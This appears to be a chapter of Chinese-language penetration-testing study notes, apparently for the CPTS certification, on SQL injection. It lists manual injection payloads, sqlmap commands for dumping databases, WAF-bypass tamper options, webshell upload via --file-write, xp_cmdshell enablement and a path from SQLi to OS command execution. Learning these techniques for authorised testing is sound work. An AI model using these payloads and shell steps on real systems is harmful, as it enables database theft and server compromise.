# 第 38 章 - SQL 注入

## 標籤

- #cpts
- #chapter
- #web
- #sqli

## 學習目標

- 理解 SQL Injection 的成因與主要類型。
- 能分辨 error-based、boolean-based、time-based 與 stacked/query-context 差異。
- 掌握手動測試與 sqlmap 的實際指令。
- 知道如何從 SQLi 進一步提權或取得 shell。

---

## 核心概念

SQL Injection 的本質是使用者可控輸入以不安全方式進入資料庫查詢語境，進而改變查詢邏輯。

**不同類型對應不同測試方式：**

| 類型 | 特徵 | 測試方式 |
|------|------|---------|
| Error-based | 頁面顯示 DB 錯誤訊息 | 直接讀錯誤內容 |
| Union-based | 可把查詢結果併入頁面 | UNION SELECT |
| Boolean-based Blind | 回應有差異但沒錯誤 | 條件判斷觀察差異 |
| Time-based Blind | 什麼都看不到 | SLEEP() / WAITFOR |
| Out-of-band | 外帶資料（DNS/HTTP） | DNS lookup / HTTP request |

---

## 手動測試流程

### Step 1 — 找注入點

```
常見位置：
- URL 參數：?id=1, ?page=home, ?category=2
- POST body：username=admin&password=test
- HTTP Header：User-Agent, X-Forwarded-For, Cookie, Referer
- JSON API：{"id": 1, "name": "test"}
```

### Step 2 — 初步確認

```
'                → 單引號（破壞語法）
''               → 兩個單引號（看是否恢復正常）
1' OR '1'='1    → 永真條件
1 AND 1=1       → 應該正常回傳
1 AND 1=2       → 應該回傳不同（Boolean-based 確認）
1; SELECT SLEEP(5)--  → Time-based 確認
```

### Step 3 — Union-based 手動利用

```sql
-- 找欄位數
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← 報錯就是 2 欄

-- 找顯示位置
' UNION SELECT NULL,NULL--
' UNION SELECT 1,'test'--

-- 取資料庫資訊
' UNION SELECT 1,database()--                    -- MySQL
' UNION SELECT 1,@@version--                     -- MySQL/MSSQL
' UNION SELECT 1,version()--                     -- PostgreSQL

-- 取 table 名稱
' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()--

-- 取欄位名稱
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--

-- 取資料
' UNION SELECT username,password FROM users--
```

### Step 4 — Time-based Blind（無回顯）

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- 提取資料（一個 bit 一個 bit）
' AND IF(SUBSTR(database(),1,1)='a',SLEEP(3),0)--
```

---

## sqlmap 指令

### 基本使用

```bash
# GET 參數
sqlmap -u "http://target.com/page?id=1"

# POST 表單
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test"

# 指定參數
sqlmap -u "http://target.com/page?id=1&name=test" -p id

# 帶 Cookie（需要登入後的頁面）
sqlmap -u "http://target.com/page?id=1" \
  --cookie="PHPSESSID=abc123; auth=token"

# 帶 Header
sqlmap -u "http://target.com/page" \
  --headers="X-Forwarded-For: 1*"

# 指定 HTTP method
sqlmap -u "http://target.com/api/user" \
  --data='{"id": 1}' --method=PUT \
  --headers="Content-Type: application/json"
```

### 資料撈取

```bash
# 列資料庫
sqlmap -u "http://target.com/page?id=1" --dbs

# 列 tables
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# 列 columns
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns

# dump 資料
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# dump 全部
sqlmap -u "http://target.com/page?id=1" --dump-all
```

### 加速與繞過

```bash
# 指定資料庫類型（加速）
sqlmap -u "..." --dbms=mysql

# 指定技術（避免噪音）
sqlmap -u "..." --technique=U     # Union only
sqlmap -u "..." --technique=B     # Boolean only
sqlmap -u "..." --technique=T     # Time only

# 繞過 WAF（tamper 腳本）
sqlmap -u "..." --tamper=space2comment
sqlmap -u "..." --tamper=randomcase
sqlmap -u "..." --tamper=between,randomcase

# 加延遲（避免被封）
sqlmap -u "..." --delay=1 --random-agent

# Level / Risk（越高越激進，慎用）
sqlmap -u "..." --level=5 --risk=3
```

### 取 Shell

```bash
# OS shell（需要 FILE 權限）
sqlmap -u "..." --os-shell

# SQL shell（直接執行 SQL）
sqlmap -u "..." --sql-shell

# 上傳 webshell（需要知道 web 目錄）
sqlmap -u "..." --file-write=/tmp/shell.php \
  --file-dest=/var/www/html/shell.php
```

### MSSQL 特有（xp_cmdshell）

```bash
# 啟用並執行指令
sqlmap -u "..." --dbms=mssql --os-shell

# 或手動在 sql-shell 中
sqlmap -u "..." --sql-shell
# > EXEC sp_configure 'show advanced options',1;RECONFIGURE
# > EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
# > EXEC xp_cmdshell 'whoami'
```

---

## Burp Suite 配合 sqlmap

```bash
# 1. Burp 抓到請求後，存成 request.txt
# 2. sqlmap 載入
sqlmap -r /tmp/request.txt -p id --dbs

# Burp proxy 轉發給 sqlmap
sqlmap -u "..." --proxy="http://127.0.0.1:8080"
```

---

## 常見繞過技巧

```sql
-- 大小寫混用
SeLeCt * FrOm users

-- 內聯注釋
SE/**/LECT/**/username/**/FR/**/OM/**/users

-- 空白替換
SELECT%09username%09FROM%09users   -- Tab
SELECT%0ausername%0aFROM%0ausers   -- Newline

-- 字串編碼（MySQL）
SELECT * FROM users WHERE username=0x61646d696e  -- hex: 'admin'

-- 括號繞過
SELECT(username)FROM(users)WHERE(1=1)
```

---

## SQLi → 更高權限路線

```
SQLi 取得 DB 憑證
    ↓
密碼複用（DB 密碼 = 系統密碼？）
    ↓
讀取設定檔（/etc/passwd、web config）
    ↓
寫入 Webshell（需要 FILE 權限 + 知道 web root）
    ↓
OS 命令執行
```

---

## 速查流程

```text
1. 找注入點（URL/POST/Header/Cookie）
2. 丟 ' 看有無錯誤 → Error-based 最快
3. 試 1 AND 1=1 vs 1 AND 1=2 → 有差就 Boolean-based
4. 試 SLEEP(5) → Time-based
5. 確認後上 sqlmap 自動化
6. --dbs → -D db --tables → -T tbl --dump
```

## 關聯筆記

- [[36-Web請求分析|第 36 章 - Web 請求分析]]
- [[35-Web列舉|第 35 章 - Web 列舉]]
- [[04-Volume-4-Web-Index|Vol.4 - Web Information Gathering and Attacks]]
